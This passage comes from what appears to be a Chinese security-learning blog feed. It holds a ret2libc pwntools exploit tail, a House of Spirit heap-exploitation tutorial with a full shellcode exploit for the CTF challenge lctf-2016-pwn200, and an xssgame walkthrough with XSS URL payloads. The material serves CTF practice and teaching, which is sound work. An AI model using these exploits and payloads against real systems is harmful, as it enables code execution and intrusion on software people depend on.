payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vuln_function<span class="token punctuation">)</span>

payload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>

raw_input<span class="token punctuation">(</span><span class="token string">'go?'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc_read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

libc_base_addr <span class="token operator">=</span> libc_read_addr <span class="token operator">-</span> <span class="token number">0x00000000000f6670</span>
libc_system_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x0000000000045390</span>
bin_sh_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x18c177</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'libc_read_addr:%s'</span> <span class="token operator">%</span> hex<span class="token punctuation">(</span>libc_read_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

payload  <span class="token operator">=</span> <span class="token string">''</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_system_addr<span class="token punctuation">)</span>
payload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>

raw_input<span class="token punctuation">(</span><span class="token string">'go?'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[House of Spirit]]></title>
      <url>/2017/07/26/House-of-Spirit/</url>
      <content type="html"><![CDATA[<p>在SploitFun的文章里提到</p>
<ul>
<li>House of Prime</li>
<li>House of Mind</li>
<li>House of Force</li>
<li>House of Lore</li>
<li>House of Spirit<br>崩溃,诶?查了一下资料发现,在CTF里出现的好像只有<code>House of Spirit</code>和<code>House of Force</code>,ahhhh~, 然后找一些文章学习一下这个<code>House of Spirit</code>,这个技术是与<code>fast bin</code>有关的,所以先学一下fast bin</li>
</ul>
<h2 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h2><p>看一看<a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">这个</a>和<a href="http://www.cnblogs.com/Ox9A82/p/5865420.html" target="_blank" rel="external">这个</a></p>
<p>Fast bin简单的来说就是 16-80 字节(不过好像其实是16-64)的bin优先使用fast bin<br>只有<code>fd</code>指针,最后一块的fd是空值<br>不会被合并,因为标志位都总是1</p>
<blockquote>
<p>环境说的都是x86,如果x64的话是32-128字节之间</p>
</blockquote>
<p>先进后出,像栈一样,fastbin list指向最外边(第一块)的fast bin,就是即将被取出的</p>
<p>有新的fastbin加入fastbin list的时候,新来的fastbin的fd指针指向原来最靠外的fastbin,同时fastbin list指向新来的fastbin</p>
<p>有malloc请求时候,最外边的一块(第一块),被取下,然后fastbin list会指向取下来这块的fd指向的那个地址,这个时候你的机会来了,你如果能在即将取走这块前改写他的fd,那么…怎么改写,,,一般是堆溢出</p>
<p>现在基本清楚了,那个size字段指的大小不是data的大小,本块某一字段加上本块的size值就找到了下一块相应字段的地址,所以这个size是data加上头部的大小<br>同时这个size和fast binlist是对应的</p>
<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>buf0<span class="token punctuation">,</span> <span class="token operator">*</span>buf1<span class="token punctuation">,</span> <span class="token operator">*</span>buf2<span class="token punctuation">;</span>

    buf0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>buf0<span class="token punctuation">)</span><span class="token punctuation">;</span>

    buf0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf0<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    buf2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf2 is at %p\n"</span><span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>来自上面提到的<a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">blog</a></p>
<p>malloc的顺序决定了<code>buf0</code>是地址比较小的那一块,所以<code>read</code>处对<code>buf0</code>的写能溢出改掉<code>buf1</code>的<code>fd</code></p>
<p>而这个<code>free</code>的顺序能决定,大概是fastbin list链着的顺序<br>free掉buf0: list[x] -&gt; buf1<br>free掉buf1: list[x] -&gt; buf0 -&gt; buf1</p>
<p>malloc了一次: list[x] -&gt; buf1</p>
<blockquote>
<p>这个时候list的地址应该是指向buf1这块吧,感觉原作者这里是不是画错了</p>
</blockquote>
<p>read一次,这个时候,可以改掉buf1的fd,这个fd就是我们伪造的堆块了</p>
<p>malloc第二次, 在buf1从list上unlink的时候,会把buf1的fd指向的地址,链接进去</p>
<p>malloc第三次,这个时候,会把伪造的堆块分配出来,,,</p>
<p>由于要检查chunk的size,所以我们伪造的堆块的size也应该和前面的buf1和buf0相同,所以我们伪造的堆块的偏移+4的地方,emmmm,就是那个size的地方要改成这个,或者找个满足条件的size值,伪造fd成这个值-4</p>
<p>还要注意一点就是malloc返回的值是data的地址,而系统自己管理list的时候list指向和fd指向都是指向头部,头部和data是偏移8个字节</p>
<p>这个时候我们就可以对buf2所指向的地方写了,实现任意地址读写</p>
<p>这个伪造的地址一般是bss段,要布置好<br><code>previous_size</code>[4字节] + <code>size</code>[4字节] + <code>fd</code>[4字节]<br>注意size值就行了</p>
<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>主要参考<a href="http://anquan.360.cn/learning/detail/3417.html" target="_blank" rel="external">这一篇</a>和上面的两篇<br>感觉大概是..emmmmmm~前面讲到的是在bss段上伪造堆,这个bss不属于随机化的一部分,程序运行前就能看到bss段基地址 <del>这个HOS的话,看起来是花式在栈上伪造一个堆</del></p>
<p>原文的例子</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们要利用第一个read</p>
<ol>
<li>覆盖p变量,指向伪造的堆块</li>
<li>伪造一个堆块..格式大概是<pre class="line-numbers language-c"><code class="language-c">prev_size <span class="token operator">=</span> <span class="token number">0x00</span>
size <span class="token operator">=</span> <span class="token number">0x29</span> <span class="token comment" spellcheck="true">//因为我们伪造的这个堆块大小也是32, 32 + 8 + 1 => 0x29</span>
fd <span class="token operator">=</span> <span class="token number">0x00</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>因为free的时候还会对相邻的后一个chunk(是从地址上后一个,因为这个时候还是allocate的,所以和list无关)进行检查所以,要再伪造一个堆块,大小适中就可以了,inuse要是1??</li>
</ol>
<blockquote>
<p>找打这个下一块应该是,emmmm,本块的size字段地址偏移本字段size的大小, 拿到下一块的大小,下一块的大小适中就可以了emmmmm</p>
</blockquote>
<p>之后free的时候,会把我们伪造堆块Free掉就会挂进到fastbinlistY里</p>
<p>最后再malloc的时候就能获取到我们的伪造堆块了</p>
<p>综上我们要有两个可控区域,如果在栈上的话</p>
<pre><code>+------------------+ 低地址
chunk 1
+------------------+
想要控制的地址
+------------------+
chunk2
+------------------+ 高地址
</code></pre><p>在栈上的话,肯定是先有了chunk2,然后有了chunk1,这个低地址的chunk1要能达到覆盖某个 <code>p = malloc(some_size)</code>的p的目的,然后这个chunk2用来绕过检查</p>
<h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>lctf-2016-pwn200</p>
<p>这个题目按照我这边布置的结构大概是</p>
<pre><code>+--------------------+
[8H]    RBP -------------&gt; 0x7fff ffff d9c0 (leak_addr)
+--------------------+ --&gt; 0x7fff ffff d9a0
[30H]  shellcode
+--------------------+ -+&gt; 0x7fff ffff d970 (leak_addr - 50H) [*]shellcode_addr
[20H]                   +
+--------------------+ -+&gt; 0x7fff ffff d950
[8H] ***ret_addr***     +
+--------------------+  + =====&gt; 40H的User Data
[8H] RBP                +
+--------------------+  +
[10H]                   +
+--------------------+ -+&gt; 0x7fff ffff d830 (leak_addr - 90H) [*]fake_addr (User_data)
[8H] size = 0x41
+--------------------+
[8H] prev_size
+--------------------+
[20H] padding
+--------------------+
</code></pre><p>因为<code>print(&quot;%s&quot;)</code> 是遇到<code>\x00</code>得时候才认为字符串结束,所以我们如果输入给正好30H的数据(不含有<code>\x00</code>)的话,那那就泄露出上面最上面<code>EBP</code>的值<br>因为EBP大概是<code>0x0000 7fff ffff xxxx</code> 这样子的结构,所以从低到高会泄露出6个字节</p>
<p>调试一下发现泄露出来的的EBP的值(leak_addr)和我们这个时候的EBP差20H…,<br>因为题目基本没有开任何防护,所以这里顺便铺设了shellcode,然后缓冲区是30H的大小<br>所以我们生成一个payload,然后高字节用padding够30H,发给题目</p>
<pre class="line-numbers language-python"><code class="language-python">payload  <span class="token operator">=</span> <span class="token string">''</span>
payload <span class="token operator">+=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'who are u?\n'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个时候观察一下我们的shellcode距离当前RBP有30H, 当前RBP距离leak_addr有20H偏移<br>所以</p>
<pre class="line-numbers language-python"><code class="language-python">shellcode_addr <span class="token operator">=</span> leak_addr <span class="token operator">-</span> 50H
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>后面有个功能输入id,可以伪造成第二个堆块的大小,这个id变量是放在leak_addr - 58H的地方,就是放在和我们shellcode相邻并且地址更小的那个地方,这个大小只要适当就好了,具体是在什么什么和什么什么之间来着忘记了</p>
<pre><code>id = getid()
</code></pre><p>下一步是输入money,就是我们的核心,这里有一个溢出,我们要把malloc到的一个指针p覆盖成我们的fake_addr,然后还顺便构造好我们的fake_chunk的size,我们这里构造0x41,在之后我们会通过free把他拉进list里,最后malloc出来</p>
<pre><code>+-----------+
shellcode
+-----------+ --+
id (size)       +
+-----------+   +
padding         +
+-----------+   +===&gt; fake_chunk&#39;s Size = 0x40
RIP             +
+-----------+   +
RBP             +
+-----------+   +
padding         +
+-----------+ --+--&gt; fake_addr
size (0x41)
+-----------+   
prev_size
+-----------+
</code></pre><p>大概就是这样子,<code>+</code>扩住的是我们最后要控制的地区,<code>fake_addr + 0x40 - 0x08</code>这个地址也就是id所在的地址被认为是下一块chunk,我们通过输入id,构造好了这里</p>
<p>等我们控制了这里之后,在写fake_chunk时候送一个<code>padding + shellcode_addr</code>,就能控制图中的RIP,达到了目的</p>
<p>最后poc</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># p = process('./pwn200')</span>

free_got <span class="token operator">=</span> <span class="token number">0x0000000000602018</span>

shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>

payload  <span class="token operator">=</span> <span class="token string">''</span>
payload <span class="token operator">+=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'who are u?\n'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

rbp_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

shellcode_addr <span class="token operator">=</span> rbp_addr <span class="token operator">-</span> <span class="token number">0x50</span> <span class="token comment" spellcheck="true"># 20H + 30H</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>
fake_addr <span class="token operator">=</span> rbp_addr <span class="token operator">-</span> <span class="token number">0x90</span> <span class="token comment" spellcheck="true"># offset 0x40 to shellcode</span>


p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'give me your id ~~?\n'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'32'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># id</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'give me money~\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 32bytes padding + prev_size + size + padding + fake_addr</span>
data <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span> data
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice : '</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># free(fake_addr)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice : '</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#malloc(fake_addr) #fake_addr</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'long?'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'48'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 48 + 16 = 64 = 0x40</span>
p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">'48'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># ptr = malloc(48) </span>

data <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># write to target_addr</span>
data <span class="token operator">=</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[xssgame]]></title>
      <url>/2017/07/26/xssgame-1/</url>
      <content type="html"><![CDATA[<p>发现了这个,mark一下<br><a href="http://www.xssgame.com/" target="_blank" rel="external">http://www.xssgame.com/</a></p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><pre><code>http://www.xssgame.com/f/m4KKGHi2rVUN/?query=&lt;script&gt;alert(/1/)&lt;/script&gt;
</code></pre><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>dom xss 点在这里,大概代码是这样子的</p>
<pre class="line-numbers language-html"><code class="language-html">&lt;img id="loading" src="/static/img/loading.gif" style="width: 50%" onload="startTimer('$_GET["timer"]')
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>所以认为构造<code>?timer=1&#39;);alert(&#39;1</code>就可以了结果发现不可以,不过为什么不可以呢<br>随后试了<code>%0a</code>和<code>%0d</code>都可以,所以最后payload是<br><code>http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=1&#39;)%0aalert(&#39;1</code><br>或者<br><code>http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=1&#39;)%0dalert(&#39;1</code></p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>这个name是hash</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">"Cat "</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
html <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">"&lt;img src='/static/img/cat"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre><code>http://www.xssgame.com/f/u0hrDTsXmyVJ/#33.jpg&#39;%20onerror=alert(/1/)%20k=&#39;`
</code></pre><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>走着走着,发现comfirm这里有个window.location,应该是这样子??</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'$_GET["next"]'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert(/1/)</code></p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>angular的,看不太懂,感觉我的输入被插到了一个不能解析的地方…悲剧啊,也闭合不了标签,和丢到pre里了感觉差不多,但我的看起来是在<code>&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;b&gt;</code>里的诶<br>感觉这个输出点不能用,再找找其他的</p>
<p>后来又看到了一个地方,这个应该是<code>UTM_PARAMS</code>数组里的这些,只要能被<code>getElementsByName</code>,也就是有name的都能被利用的感觉</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> UTM_PARAMS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"utm_content"</span><span class="token punctuation">,</span> <span class="token string">"utm_medium"</span><span class="token punctuation">,</span> <span class="token string">"utm_source"</span><span class="token punctuation">,</span>
  <span class="token string">"utm_campaign"</span><span class="token punctuation">,</span> <span class="token string">"utm_term"</span><span class="token punctuation">]</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">var</span> params <span class="token operator">=</span> location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> p <span class="token keyword">in</span> params<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> r <span class="token operator">=</span> params<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> UTM_PARAMS<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// *****</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>el<span class="token punctuation">.</span>length<span class="token punctuation">)</span> el<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ****</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>大概是就是你输入的查询参数键值对会</p>
<pre class="line-numbers language-html"><code class="language-html">document.getElementsByName(key).value = decodeURIComponent(value);
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>那我们看看</p>
